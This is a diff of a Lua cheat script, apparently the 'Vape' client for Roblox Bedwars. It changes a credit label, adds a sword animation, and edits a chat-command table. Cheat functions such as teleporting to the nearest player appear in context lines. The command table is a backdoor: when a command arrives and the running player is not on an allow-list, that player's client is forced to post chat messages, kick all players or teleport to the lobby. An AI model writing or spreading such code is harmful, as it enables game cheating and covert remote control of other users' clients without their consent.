@@ -2227,7 +2227,7 @@ do
 	end)
 	local textlabel = Instance.new("TextLabel")
 	textlabel.Size = UDim2.new(1, 0, 0, 36)
-	textlabel.Text = ""
+	textlabel.Text = "Config Made By Snoopy Configs Team. Have Fun Using The Config!"
 	textlabel.BackgroundTransparency = 1
 	textlabel.ZIndex = 10
 	textlabel.TextStrokeTransparency = 0
@@ -3613,6 +3613,13 @@ runFunction(function()
 		Exhibition = {
 			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.1},
 			{CFrame = CFrame.new(0.7, -0.71, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.2}
+		},
+		["CustomSP+"] = {
+			{CFrame = CFrame.new(0.39, 1, 0.2) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.13},
+			{CFrame = CFrame.new(0.39, 1, 0.2) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.03},
+			{CFrame = CFrame.new(0.7, 0.1, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.09},
+			{CFrame = CFrame.new(0.7, 0.1, 0.59) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.05},
+			{CFrame = CFrame.new(0.39, 0.1, 1.37) * CFrame.Angles(math.rad(-84), math.rad(50), math.rad(-38)), Time = 0.13}
 		},
 		["Exhibition Old"] = {
 			{CFrame = CFrame.new(0.69, -0.7, 0.6) * CFrame.Angles(math.rad(-30), math.rad(50), math.rad(-90)), Time = 0.15},
@@ -10484,6 +10491,7 @@ runFunction(function()
 		return nearestPlayer
 	end
 
+
 	function tweenToNearestPlayer()
 		local nearestPlayer = findNearestPlayer()
 		if nearestPlayer and not hasTeleported then
@@ -10663,7 +10671,7 @@ local commands = {
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local textChatService = game:GetService("TextChatService")
 			wait(0.0001)
-			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using Vape Made By 7GrandDadPGN")
+			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using Vape Made By | 7GrandDadPGN")
 		end
 	end,
 	[".void"] = function()
@@ -10702,7 +10710,7 @@ local commands = {
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			wait(1)
 			for index, player in pairs(game.Players:GetPlayers()) do
-				player:Kick("7GrandDadPGN")
+				player:Kick("Kicked By 7GrandDadPGN")
 			end
 		end
 	end,
@@ -10728,7 +10736,7 @@ local commands = {
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
 		end
 	end,
-	[".lobby"] = function()
+	[""] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
 		end
@@ -10969,7 +10977,7 @@ txt.OnIncomingMessage = function(msg)
 				if v.id == userId then
 					if not hasTag then
 						hasTag = true
-						p.PrefixText = "<font color='#b800b8'>[VAPE PRIVATE]</font> " .. msg.PrefixText
+						p.PrefixText = "<font color='#ff0000'>[VAPE PRIVATE]</font> " .. msg.PrefixText
 					end
 					userType = 3
 				end
